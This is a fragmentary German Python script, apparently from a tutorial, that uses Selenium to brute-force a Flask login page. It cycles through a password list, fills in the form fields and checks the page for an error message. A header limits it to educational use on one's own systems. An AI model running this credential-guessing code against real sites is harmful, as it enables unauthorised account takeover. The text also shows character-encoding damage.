...
"""
============================================
Selenium Bruteforce fÃ¼r Flask Login
============================================
WICHTIG: Nur fÃ¼r Bildungszwecke und eigene Systeme!

Installation:
    pip install selenium webdriver-manager

Was macht Selenium?
- Ãffnet einen echten Chrome-Browser
...
def try_login(driver, username, password):
    ...
    try:
        ...
        # Username-Feld finden und ausfÃ¼llen
        username_field = driver.find_element(By.NAME, "username")
        username_field.clear()
        username_field.send_keys(username)

        # Password-Feld finden und ausfÃ¼llen
        ...
        # PrÃ¼fe ob Login erfolgreich (nicht mehr auf /login)
        ...
        # Alternativ: PrÃ¼fe auf Fehlermeldung
        page_source = driver.page_source
        if "UngÃ¼ltige Eingabedaten" in page_source or "Logged in" not in page_source:
            return False
...
def main():
    ...
    print(f"[+] {len(passwords)} PasswÃ¶rter geladen")
    print()

    # Chrome WebDriver starten
    driver = setup_driver(headless=HEADLESS)

    success = False  # Flag fÃ¼r erfolgreichen Login

    try:
        # Durch alle PasswÃ¶rter iterieren
        for i, password in enumerate(passwords, 1):
            ...
            if success:
                ...
                input("\n[>] DrÃ¼cke Enter um den Browser zu schlieÃen...")

                break
            else:
                print("â Fehlgeschlagen")
